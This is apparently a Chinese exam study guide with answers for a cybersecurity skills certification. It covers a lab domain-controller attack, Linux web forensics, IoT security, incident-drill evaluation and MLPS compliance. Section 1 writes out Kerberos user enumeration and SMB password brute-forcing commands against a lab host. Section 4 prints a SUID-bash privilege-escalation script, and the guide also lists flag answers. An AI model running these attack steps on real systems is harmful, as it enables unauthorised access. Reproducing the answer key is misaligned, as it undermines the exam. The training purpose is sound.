1. 网络安全风险评估

题目

  1. 对开放服务进行安全性测试，找到用户名作为 flag1。
  2. 对该用户名口令进行安全测试，找到密码作为 flag2。
  3. 用获取账户登录开放服务，找到 flag3。
  4. 对服务器开放服务进行风险评估，利用风险点找到 flag4。

答案

问题答案备注
flag1（用户名）SVC_MGR通过 Kerberos 用户枚举 / 匿名 LDAP 发现
flag2（口令）p@ssw0rd对 SMB 服务暴力破解 / 弱口令字典得到
flag36a61c7e0d11a9f0a4bd3bc33cdea542d登录 SMB 后在目标文件中读取
flag457019fe9346c5f4c9a6b62cbac29bdc3位于 users\\SVC_MGR\\Desktop\\flag4.txt

详细步骤

阶段 1：信息收集 & 服务识别

开局先 nmap 一把，目标大概率是 Windows 域控，常见暴露的服务有：

  • 53/DNS、88/Kerberos、135/RPC、139/NetBIOS、445/SMB
  • 389/LDAP、464/kpasswd、593/RPC over HTTP、636/LDAPS
  • 3389/RDP、5985/WinRM
# 1. 通过匿名 LDAP 获取域信息（访问授权风险点：允许匿名绑定）
python3 ldapdomaindump -o /tmp/ldd 10.7.10.219
# 关键输出：defaultNamingContext = DC=lx,DC=com
# 域名为 lx.com，域控主机名为 LX-DC.lx.com

阶段 2：Kerberos 用户枚举找到用户名（flag1）

利用 Kerberos 对 AS-REQ 错误码的"差别对待"白嫖用户名，完全不需要凭证：

  • KDC_ERR_C_PRINCIPAL_UNKNOWN → 用户不存在
  • KDC_ERR_PREAUTH_FAILED / KDC_ERR_CLIENT_REVOKED → 用户存在
# 使用 impacket GetNPUsers.py 枚举
python3 GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip 10.7.10.219 'lx.com/'
# 实测发现的有效用户
# administrator  -> PREAUTH_REQUIRED（存在）
# krbtgt         -> CLIENT_REVOKED（存在，系统账户）
# lx-dc          -> PREAUTH_REQUIRED（存在，域控机器账户）
# SVC_MGR        -> PREAUTH_REQUIRED（存在）

结合评分标准，flag1 为 SVC_MGR。

阶段 3：SMB 弱口令爆破拿密码（flag2）

拿到用户名后，针对 SMB 服务用 weakpass.txt 定向开搞：

# impacket smbclient.py 逐个尝试
python3 smbclient.py 'lx.com/SVC_MGR:p@ssw0rd@10.7.10.219 '

实测命中密码为 p@ssw0rd。

小七 Tips：考试现场已经发了 weakpass.txt，直接上 Hydra / crackmapexec / smbclient 脚本都能跑通，没必要自己造轮子。

阶段 4：登录 SMB 收集 flag3 / flag4

用 SVC_MGR 凭据登录 SMB，直接进 users 共享的桌面目录翻文件：

python3 smbclient.py 'lx.com/SVC_MGR:p@ssw0rd@10.7.10.219 ' -file cmds.txt
# cmds.txt:
# use users
# cd SVC_MGR\Desktop
# cat flag4.txt
# cat flag5.txt

实测结果：

  • flag4.txt 内容即为 flag4：57019fe9346c5f4c9a6b62cbac29bdc3
  • flag5.txt 提示提交管理员用户的 SPN，如 kadmin/changepw
  • flag3 需进一步在目标文件系统中定位（评分标准答案：6a61c7e0d11a9f0a4bd3bc33cdea542d）

2. 新技术、新应用防护 - B · ETC 物联网安全案例分析

题目

某市高速公路 ETC 系统：

  • 利用物联网技术实现车辆信息识别、行驶路程计算、过路费计算和收费。
  • 由收费站数据采集、数据传输、监控管理三部分组成。

问题 1：物联网体系分哪三层？

  1. 感知层（最贴近"物"的那一层）：用 RFID、传感器、摄像头这些前端"五官"，把车辆信息抓回来。
  2. 网络层（负责"跑腿"的那一层）：靠 DSRC、5G、NB-IoT 之类的无线链路，把数据搬到云端/收费站。
  3. 应用层（最贴业务的那一层）：做收费结算、车辆识别、清分拆账这些具体的活。

问题 2：物联网一般会踩哪些安全坑？

  1. 感知层坑：OBU/RSU 被克隆替换、摄像头被贴纸挡住、地感被电钻打飞、采集数据被偷偷改掉。
  2. 网络层坑：无线信号被路人"蹭听"、假基站中间人劫持、几万 QPS 的 DDoS 打瘫网关、OSPF/BGP 路由被劫。
  3. 应用层坑：未授权访问业务后台、扣费/通行数据外泄、套牌车身份冒用、漏扫出来的 Web 漏洞被挂后门。
  4. 平台层坑：云厂商配置开"自动公开"、API 忘了限速被刷、数据汇总后撞库 → 整库泄露。
  5. 管理层坑：设备密钥 Excel 存、固件推送从来没人点、SIEM 收进来从来没人看。

问题 3：要给系统叠哪些防护 buff？

  1. 感知层 buff：
    • 设备入网要做身份认证 + 权限控制
    • 固件必须签名 + 安全启动校验
    • 硬件加防拆开关，异常立即告警
    • 采集数据本地加密 + 完整性校验
  2. 网络层 buff：
    • 通信走 TLS / DTLS 或国密 SM2/SM4
    • 启用安全路由 + IDS 入侵检测
    • 不同业务域用 VLAN / 防火墙隔开
    • 对接专业的 DDoS 清洗与流量调度
  3. 应用层 buff：
    • 统一身份鉴别 + RBAC 授权
    • 上线前先过代码审计 + 渗透测试
    • 敏感字段脱敏、隐私数据加密落盘
    • 操作日志全留痕，定期做关联分析
  4. 平台/管理层 buff：
    • 设备从入库到报废的全生命周期台账
    • OTA 通道安全可控，固件升级有版本与签名校验
    • 密钥集中生成，硬件安全模块（HSM）分发
    • 态势感知 + 应急响应 SOP 配套

3. 网络安全应急响应制度 - E 套 · 应急演练评估

题目

小程是某智慧校园信息系统网络安全管理员，需针对信息系统自身安全故障、网络安全事件等组织实操演练，依据 GB/T 38645-2020 回答：

  1. 作为应急演练评估人员，主要职责包括哪些工作（至少 4 项）？
  2. 应急演练评估报告主要包括哪些内容（至少 6 项）？

问题 1：评估人员要干哪几件事？

  1. 前期准备：先把预案、脚本、评分表读熟，把计时器、记录表、录像设备准备好。
  2. 现场观摩：每个环节跟到底，把响应时间、操作动作、汇报链路、跨组沟通都记下来。
  3. 问题归集：把现场冒出的技术、管理、流程问题分类归集，再分析影响范围。
  4. 成效评估：对照预案目标，客观打分：目标达成度、流程合规度、处置有效度一个都不能少。
  5. 报告输出：汇总数据 + 写评估报告 + 给出能落地的整改建议。

问题 2：评估报告要写哪些板块？

  1. 演练概况：目的、时间、地点、参演单位、模拟事件场景。
  2. 组织与实施：演练流程、各阶段开展情况、指挥部调度效率。
  3. 目标达成度：逐条核对预期目标，给出达成率与差距分析。
  4. 参演人员评价：按角色评估响应速度、操作规范性、团队协作水平。
  5. 问题清单：分类列出技术缺陷、流程缺失、管理不足、协调卡点。
  6. 改进建议：针对每条问题给出整改措施、责任人与完成时限。
  7. 评估结论：总结演练总体表现，明确"通过 / 不通过"及后续跟进事项。

4. 网络安全应急响应技术 - Linux Web 应急取证

题目

  1. 攻击者成功访问目标站点页面的总次数。
  2. 攻击者利用 Webshell 的页面 URI。
  3. 信息收集脚本的 32 位小写 MD5。
  4. 管理员权限利用脚本文件的 32 位小写 MD5。

实测答案

问题答案备注
Q1 成功访问次数52攻击者 IP 10.20.125.64 的 HTTP 200 响应数
Q2 Webshell URI/dede/login.phpPOST 请求集中出现，文件内容含登录状态
Q3 信息收集脚本 MD5047221a55de17485c651c83c8a9db329/var/www/html/data/.ll.sh（LinEnum 类脚本）
Q4 权限利用脚本 MD56bcb27ecf27f5eeb5b3dc162dc721f5b/home/ubuntu18/tmp/gzip

关键命令

小七路线图：先找攻击者 IP → 再找 Webshell → 再找信息收集脚本 → 最后找提权脚本，按这条线走少走弯路。

步骤 1：定位攻击者 IP 与成功访问次数

# 统计请求量最大的 IP
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
# 统计 10.20.125.64 的 HTTP 200 次数
awk '$1=="10.20.125.64" && $9==200 {c++} END{print c}' /var/log/apache2/access.log
# 实测：52

步骤 2：定位 Webshell

# 查看攻击者 POST 请求
awk '$1=="10.20.125.64" && $6=="\"POST" {print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn
# 实测集中 POST：/dede/login.php

步骤 3：查找信息收集脚本

# 按时间/名称查找可疑脚本
find /var/www/html /tmp /var/tmp /home -type f -name '*.sh' 2>/dev/null

# 实测发现 /var/www/html/data/.ll.sh（LinEnum 脚本，46631 字节）
md5sum /var/www/html/data/.ll.sh
# 047221a55de17485c651c83c8a9db329

步骤 4：查找权限提升利用脚本

# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
# 实测发现 /home/ubuntu18/tmp/bash
# 查看 /home/ubuntu18/tmp 目录
ls -la /home/ubuntu18/tmp/
# -rwsr-xr-x 1 root root       1113504 /home/ubuntu18/tmp/bash
# -rwxrwxr-x 1 ubuntu18 ubuntu18     85 /home/ubuntu18/tmp/gzip

# 伪造 gzip 脚本内容
cat /home/ubuntu18/tmp/gzip
# #!/bin/bash
# cp /bin/bash /home/ubuntu18/tmp/bash
# chmod 4755 /home/ubuntu18/tmp/bash

md5sum /home/ubuntu18/tmp/gzip
# 6bcb27ecf27f5eeb5b3dc162dc721f5b

5. 网络安全等级保护 - B · 医院 HIS 系统

题目

某市三甲医院 HIS 系统：

  • 业务信息泄露或损坏会对患者造成特别严重影响，对公共利益与社会秩序造成严重损害。
  • 系统服务中断会对患者获取医疗服务造成严重影响，对公共利益与社会秩序造成一般损害。

问题 1：系统定级（按"就高不就低"原则）

  • 业务信息安全保护等级：三级
  • 系统服务安全保护等级：二级
  • 整体定级：三级

小七口诀："业务视人命，服务看影响"——涉及患者隐私/生命安全的业务信息一律往高靠；服务中断的影响只到"一般"就保持二级。

问题 2：安全管理中心要承载哪些能力？

① 系统管理（"管机器"的）

  • 系统管理员必须先身份鉴别，再通过专用命令或操作台配置系统，所有动作全程审计；
  • 由系统管理员统一管用户身份、资源配置、加载启动、异常处理、备份与恢复等运行事项。

② 安全管理（"管策略"的）

  • 安全管理员同样要身份鉴别 + 专用通道 + 操作审计；
  • 由安全管理员统一配安全参数、统一打标签、授予权限、配置可信验证策略。

③ 集中管控（"管全局"的）

  1. 划一片独立管理区，把散在各处的安全设备/组件纳管起来；
  2. 搭一条专用的安全传输通道给这些设备/组件下指令；
  3. 对链路、安全设备、网络设备、服务器等运行状态进行集中监测；
  4. 把各设备上的审计数据汇总集中分析，并保证留存时间符合法规；
  5. 把安全策略、恶意代码库、补丁升级等统一管起来；
  6. 对网络上的安全事件做识别、告警、关联分析。

问题 3：边界这一圈要怎么做？

① 边界防护（2 分）

  • 所有跨边界的流量必须经过受控接口；
  • 能掐断外来设备私接内网；
  • 能掐断内网用户私自联外网；
  • 无线网络必须走受控边界设备才能进内网。

② 访问控制（5 分）

  • 默认拒绝 + 显式放行，最小化原则；
  • 定期清理无效 ACL，规则越少越好；
  • 五元组检查（源/目的 IP、端口、协议）；
  • 结合会话状态精确放行/拒绝；
  • 支持应用层协议与内容的访问控制。

③ 入侵防范（3 分）

  • 关键节点部署检测手段，内外双向攻击都要能拦；
  • 对网络行为做深度分析，覆盖已知 + 新型攻击；
  • 记录攻击源 IP、类型、目标、时间，严重事件即时告警。

问题 4：安全运维管理要凑齐哪些料？

① 重要资产配置信息（2 分）

建档保存：

  • 整张网络拓扑图
  • 每台设备装的软件清单
  • 软件版本和补丁情况
  • 关键配置参数

② 安全事件报告和处置制度（2 分）

制度要写明：

  • 分级分类的安全事件报告/处置/响应流程；
  • 现场处置、信息上报、后期恢复的岗位职责与衔接关系。

③ 备份要求（3 分）

策略要规定：

  • 备份方式（全量 / 增量 / 差异）
  • 备份频度（每日 / 每周 / 每月）
  • 存储介质（磁盘 / 磁带 / 云）
  • 保留期限（满足法规 + 业务恢复目标）

问题 5：整改建议（按等保 2.0 逐条对标）

结合 HIS 系统常见的薄弱环节，挨个对症下药：

① 管理中心这块要补的：

  • 把系统、安全、审计"三员"岗位立起来，职责分离、互相监督；
  • 上一套集中管控平台，把防火墙、堡垒机、数据库审计、终端 EDR 全收进来；
  • 所有日志统一扔进 SOC/SIEM，留存不少于 6 个月，配上关联分析与告警规则；
  • 把补丁和恶意代码库的升级做成基线，由平台统一下发。

② 边界这块要补的：

  • 按门诊、住院、办公、互联网接入划分安全域，域之间用下一代防火墙隔离；
  • 收敛对外开放端口，ACL 全部按白名单走，长期没人用的规则该删就删；
  • 互联网出口和核心交换机旁路挂 IPS，SQL 注入、Webshell 上传等高危动作现场拦截；
  • 不必要的无线 AP 直接关掉，留下的统一走准入网关 + 802.1X 认证。

③ 计算环境这块要补的：

  • 服务器、数据库全部强口令 + 多因素认证，默认账号、共享账号一律清掉；
  • 核心业务上线主机 EDR，应用最小权限、数据库行级访问控制；
  • 统一防病毒 + 主机防火墙 + 白名单三件套；
  • 姓名、身份证、病历这些敏感数据按等保要求加密存储与传输，前台展示一律脱敏。

④ 运维管理这块要补的：

  • 搭一个 CMDB，动态记录拓扑、软件、版本、补丁、配置基线；
  • 出《安全事件报告与处置管理制度》，明确 5×8 / 7×24 值班和上报流程；
  • 核心 HIS 数据用"本地全量 + 异地增量 + 云端快照"三级备份，恢复演练每半年至少 1 次；
  • 每年至少 1 次等保测评 + 1 次红蓝对抗/渗透测试。

解题套路小结

  1. 定级：结合"业务信息"与"系统服务"两条线分别判定，再按就高原则汇总。
  2. 安全管理中心：围绕系统管理、安全管理、集中管控三大块成体系作答。
  3. 安全区域边界：按边界防护 → 访问控制 → 入侵防范三段式展开。
  4. 安全运维管理：围绕资产配置、事件制度、备份要求三块做清单式回答。
  5. 整改建议：从管理中心、区域边界、计算环境、运维管理 4 个维度，对照等保 2.0 控制项逐条给出整改措施。

6. 培训实施与技术指导 - F · 培训大纲 + 考核方案

题目要求

  1. 结合国标二级"网络安全等级保护"工作内容，拟制一份培训大纲。
  2. 结合国标二级"网络安全等级保护"工作内容，拟制一份考核方案。

参考答案 1：培训大纲（等保 2.0 小七版）

一、为什么办这次培训？

背景：对照《网络与信息安全管理员》国家职业技能标准（2020 版）二级/技师的技能要求，定制本轮培训。

目标：让学员能独立搞定等保定级、备案、测评、整改、运维的全链路工作。

学什么：等保 2.0 控制项、定级方法、差距分析、整改方案、测评流程。

学了有啥用：能独立承接等保项目，技能等级认定一次过。

二、怎么安排？

  • 谁参加：二级/技师方向的学员
  • 学多久：共 X 天，合计 X 学时
